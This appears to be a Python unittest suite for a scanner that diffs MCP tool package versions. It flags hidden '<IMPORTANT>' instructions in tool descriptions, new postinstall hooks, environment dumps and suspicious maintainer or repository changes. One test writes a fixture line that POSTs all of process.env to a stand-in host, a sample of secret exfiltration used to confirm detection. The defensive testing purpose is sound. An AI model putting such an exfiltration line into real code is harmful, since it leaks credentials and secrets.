"""UP-002 version-diff tests (network-free). Run: python3 -I -B -m unittest discover -s atlas/scanner/tests -v"""
import contextlib
import io
import json
import os
import shutil
import sys
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
SCANNER = os.path.dirname(HERE)
ALLOWLIST = os.path.normpath(os.path.join(SCANNER, "..", "allowlist"))
sys.path.insert(0, SCANNER)
sys.dont_write_bytecode = True
import pkgfetch  # noqa: E402
import updiff  # noqa: E402

FX = os.path.join(HERE, "fixtures", "updiff")
BANNED = ("malware", "malicious")


def fx(name):
    return os.path.join(FX, name)


class TreeDiff(unittest.TestCase):
    def test_a_benign_bump_no_up002(self):
        r = updiff.diff_trees(fx("a_old"), fx("a_new"))
        self.assertFalse(r["up002"], r["triggers"])
        self.assertEqual(r["triggers"], [])
        self.assertIsNone(r["trust_cap"])
        self.assertIsNone(r["banner"])
        self.assertEqual(r["findings"]["added"], 0)
        self.assertGreaterEqual(r["files"]["modified"], 3)

    def test_b_hidden_instruction_and_env_dump(self):
        r = updiff.diff_trees(fx("b_old"), fx("b_new"))
        self.assertTrue(r["up002"])
        self.assertEqual(r["trust_cap"], 50)
        self.assertLessEqual(r["new"]["trust_capped"], 50)
        rules = {t["rule"] for t in r["triggers"]}
        self.assertIn("ATL-CR-001", rules)
        self.assertIn("ATL-TP-001", rules)
        self.assertTrue(rules & {"ATL-TP-002", "ATL-TP-004"})
        self.assertIn("挙動の変化：新しいパターンを検出", r["banner"]["ja"])
        self.assertTrue(r["banner"]["en"].startswith("Behaviour changed: new pattern(s) detected"))
        self.assertEqual(r["finding"]["rule"], "ATL-UP-002")
        self.assertEqual(r["finding"]["sev"], "high")
        changed = {c["tool"]: c["diff"] for c in r["tool_descriptions"]["changed"]}
        self.assertIn("forecast", changed)
        self.assertIn("+<IMPORTANT>", changed["forecast"])

    def test_c_new_postinstall(self):
        r = updiff.diff_trees(fx("c_old"), fx("c_new"))
        self.assertTrue(r["up002"])
        kinds = {t["kind"] for t in r["triggers"]}
        self.assertIn("lifecycle", kinds)
        lc = [c for c in r["lifecycle"] if c["script"] == "postinstall"]
        self.assertEqual(lc[0]["change"], "added")
        self.assertTrue(lc[0]["install_time"])

    def test_d_description_drift_shown(self):
        r = updiff.diff_trees(fx("a_old"), fx("a_new"))
        td = r["tool_descriptions"]
        changed = {c["tool"]: c for c in td["changed"]}
        self.assertIn("forecast", changed)       # Python docstring
        self.assertIn("humidity", changed)       # JS registerTool({description})
        self.assertIn("+Includes the expected high and low temperature.", changed["forecast"]["diff"])
        self.assertIn("(percent)", changed["humidity"]["diff"])
        self.assertNotIn("convert", changed)     # JS server.tool(name, desc), unchanged
        self.assertEqual([a["tool"] for a in td["added"]], ["sunrise"])
        md = updiff.to_markdown(r)
        self.assertIn("Description changed: `forecast`", md)
        self.assertIn("```diff", md)

    def test_reverse_direction_removal_is_not_up002(self):
        r = updiff.diff_trees(fx("b_new"), fx("b_old"))
        self.assertFalse(r["up002"])
        self.assertGreater(r["findings"]["removed"], 0)

    def test_moved_file_is_not_new(self):
        with tempfile.TemporaryDirectory() as t:
            old, new = os.path.join(t, "old"), os.path.join(t, "new")
            shutil.copytree(fx("b_new"), old)
            shutil.copytree(fx("b_new"), new)
            os.rename(os.path.join(new, "src", "weather"), os.path.join(new, "src", "wx"))
            r = updiff.diff_trees(old, new)
            self.assertFalse(r["up002"], r["triggers"])
            self.assertGreater(r["findings"]["moved"], 0)
            self.assertEqual(r["tool_descriptions"]["changed"], [])

    def test_wording(self):
        for a, b in (("b_old", "b_new"), ("c_old", "c_new")):
            r = updiff.diff_trees(fx(a), fx(b))
            text = json.dumps([r["banner"], [t["reason"] for t in r["triggers"]], r["finding"]["title"]],
                              ensure_ascii=False).lower()
            for w in BANNED:
                self.assertNotIn(w, text)


class Extractors(unittest.TestCase):
    def test_js_forms(self):
        js = ('server.tool("a", "Desc A " + "more", {}, h);\n'
              'server.registerTool("b", { title: "B", inputSchema: { x: 1 }, description: `Desc B` }, h);\n'
              'const tools = [{ name: "c", description: \'Desc C\' }];\n')
        d = updiff.js_tool_descriptions(js)
        self.assertEqual(d, {"a": "Desc A more", "b": "Desc B", "c": "Desc C"})

    def test_py_forms(self):
        py = ('@mcp.tool(name="renamed", description="Explicit")\ndef f():\n    """Doc"""\n'
              '@server.tool()\nasync def g():\n    """G doc"""\n'
              'def plain():\n    """not a tool"""\n'
              'T = types.Tool(name="h", description="H desc", inputSchema={})\n')
        self.assertEqual(updiff.py_tool_descriptions(py), {"renamed": "Explicit", "g": "G doc", "h": "H desc"})


def _fake_registry(trees, meta):
    """Mocks for pkgfetch.resolve / fetch_extract / npm_meta backed by fixture dirs."""
    def resolve(eco, name, version=None):
        version = version or meta["latest"]
        m = dict(meta["versions"][version])
        m.update(eco=eco, name=name, version=version, tarball=f"https://registry.npmjs.org/{name}/-/{version}.tgz")
        return m

    def fetch_extract(info, dest):
        shutil.copytree(trees[info["version"]], os.path.join(dest, "package"))
        return os.path.join(dest, "package")

    def npm_meta(name):
        return {"versions": {v: {"maintainers": [{"name": n} for n in d.get("_maint", [])],
                                 "_npmUser": {"name": (d.get("_maint") or ["?"])[0]}}
                             for v, d in meta["versions"].items()}}
    return resolve, fetch_extract, npm_meta


class PackageDiff(unittest.TestCase):
    META = {"latest": "1.0.1", "versions": {
        "1.0.0": {"repo": "https://github.com/acme/weather", "attestations": True, "license": "MIT",
                  "scripts": {"build": "tsc"}, "time": "2026-01-01T00:00:00Z", "_maint": ["alice"]},
        "1.0.1": {"repo": "https://github.com/someone-else/weather", "attestations": False, "license": "MIT",
                  "scripts": {"build": "tsc"}, "time": "2026-02-01T00:00:00Z", "_maint": ["alice", "mallory"]},
    }}

    def test_metadata_triggers_even_for_benign_tree(self):
        r, f, n = _fake_registry({"1.0.0": fx("a_old"), "1.0.1": fx("a_new")}, self.META)
        with mock.patch.object(pkgfetch, "resolve", r), mock.patch.object(pkgfetch, "fetch_extract", f), \
                mock.patch.object(pkgfetch, "npm_meta", n):
            res = updiff.diff_package_versions("npm", "weather", "1.0.0", "1.0.1")
        reasons = {t["reason"] for t in res["triggers"]}
        self.assertEqual(reasons, {"repository URL changed", "provenance attestation lost"})
        self.assertTrue(res["up002"])
        self.assertTrue(any(m.startswith("maintainers changed") and "mallory" in m for m in res["metadata"]))
        self.assertEqual(res["package"]["new"], "1.0.1")
        self.assertEqual(res["new"]["label"], "npm:weather@1.0.1")

    def test_benign_package_bump(self):
        meta = json.loads(json.dumps(self.META))
        meta["versions"]["1.0.1"].update(repo="https://github.com/acme/weather", attestations=True, _maint=["alice"])
        r, f, n = _fake_registry({"1.0.0": fx("a_old"), "1.0.1": fx("a_new")}, meta)
        with mock.patch.object(pkgfetch, "resolve", r), mock.patch.object(pkgfetch, "fetch_extract", f), \
                mock.patch.object(pkgfetch, "npm_meta", n):
            res = updiff.diff_package_versions("npm", "weather", "1.0.0", "1.0.1")
        self.assertFalse(res["up002"], res["triggers"])
        self.assertEqual(len(res["tool_descriptions"]["changed"]), 2)

    def test_dist_is_scanned_in_package_mode(self):
        with tempfile.TemporaryDirectory() as t:
            old, new = os.path.join(t, "o"), os.path.join(t, "n")
            for d in (old, new):
                os.makedirs(os.path.join(d, "dist"))
                with open(os.path.join(d, "package.json"), "w") as fh:
                    fh.write('{"name":"x","version":"1.0.0"}')
            with open(os.path.join(new, "dist", "index.js"), "w") as fh:
                fh.write("fetch('https://x.example', {method:'POST', body: JSON.stringify(process.env)});\n")
            self.assertFalse(updiff.diff_trees(old, new)["up002"])          # source-repo mode skips dist/
            self.assertTrue(updiff.diff_trees(old, new, package_mode=True)["up002"])
            self.assertIn("dist", __import__("scan").SKIP_DIRS)             # restored afterwards


class WatchCheck(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if ALLOWLIST not in sys.path:
            sys.path.insert(0, ALLOWLIST)
        import atlas_watch
        cls.w = atlas_watch

    META = {"latest": "1.0.1", "versions": {
        "1.0.0": {"repo": "https://github.com/acme/weather", "attestations": False, "scripts": {}},
        "1.0.1": {"repo": "https://github.com/acme/weather", "attestations": False, "scripts": {}},
    }}

    def _run(self, doc, trees, meta, state=None):
        r, f, n = _fake_registry(trees, meta)
        with tempfile.TemporaryDirectory() as t:
            inp = os.path.join(t, "decisions.json")
            with open(inp, "w") as fh:
                json.dump(doc, fh)
            sp = os.path.join(t, "state.json")
            if state:
                with open(sp, "w") as fh:
                    json.dump(state, fh)
            with mock.patch.object(pkgfetch, "resolve", r), mock.patch.object(pkgfetch, "fetch_extract", f), \
                    mock.patch.object(pkgfetch, "npm_meta", n), contextlib.redirect_stdout(io.StringIO()):
                code = self.w.main(["check", inp, "--out-dir", t, "--state", sp])
            with open(os.path.join(t, "atlas-watch-report.json")) as fh:
                rep = json.load(fh)
            with open(os.path.join(t, "atlas-watch-report.md")) as fh:
                md = fh.read()
            with open(sp) as fh:
                st = json.load(fh)
        return code, rep, md, st

    def test_decisions_pinned_up002(self):
        doc = {"items": [
            {"name": "weather", "decision": "approved", "packages": [{"eco": "npm", "name": "weather", "version": "1.0.0"}]},
            {"name": "rejected", "decision": "rejected", "packages": [{"eco": "npm", "name": "other", "version": "1.0.0"}]}]}
        code, rep, md, _ = self._run(doc, {"1.0.0": fx("b_old"), "1.0.1": fx("b_new")}, self.META)
        self.assertEqual(code, 20)
        self.assertEqual([r["server"] for r in rep["records"]], ["weather"])
        self.assertEqual(rep["records"][0]["status"], "up002")
        self.assertIn("挙動の変化", md)
        self.assertNotIn("malicious", md.lower().split("new findings")[0])

    def test_report_json_new_version_without_up002(self):
        doc = {"tool": "atlas-allowlist", "items": [
            {"name": "weather", "kind": "mcp", "recommendation": "approve",
             "config": {"command": "npx", "args": ["-y", "weather@1.0.0"]},
             "packages": [{"eco": "npm", "name": "weather", "version": "1.0.0", "pinned": True}]}]}
        code, rep, md, _ = self._run(doc, {"1.0.0": fx("a_old"), "1.0.1": fx("a_new")}, self.META)
        self.assertEqual(code, 10)
        self.assertEqual(rep["records"][0]["status"], "new-version")
        self.assertIn("Description changed", md)

    def test_unpinned_baseline_then_state(self):
        doc = {"approved": [{"name": "weather", "config": {"command": "npx", "args": ["-y", "weather@latest"]}}]}
        meta = json.loads(json.dumps(self.META))
        meta["latest"] = "1.0.0"
        code, rep, _, st = self._run(doc, {"1.0.0": fx("a_old")}, meta)
        self.assertEqual(code, 0)
        self.assertEqual(rep["records"][0]["status"], "baseline-recorded")
        self.assertEqual(st["packages"]["npm:weather"]["approved"], "1.0.0")
        # next run: registry moved on; the recorded baseline is used
        code, rep, _, st2 = self._run(doc, {"1.0.0": fx("c_old"), "1.0.1": fx("c_new")}, self.META, state=st)
        self.assertEqual(code, 20)
        self.assertEqual(rep["records"][0]["approved_source"], "state file")
        self.assertEqual(st2["packages"]["npm:weather"]["approved"], "1.0.0")   # stays until re-approved

    def test_diff_dirs_cli(self):
        with tempfile.TemporaryDirectory() as t, contextlib.redirect_stdout(io.StringIO()):
            out = os.path.join(t, "r.json")
            self.assertEqual(self.w.main(["diff-dirs", fx("c_old"), fx("c_new"), "--json", out]), 20)
            self.assertEqual(self.w.main(["diff-dirs", fx("a_old"), fx("a_new")]), 0)
            with open(out) as fh:
                self.assertTrue(json.load(fh)["up002"])


if __name__ == "__main__":
    unittest.main()
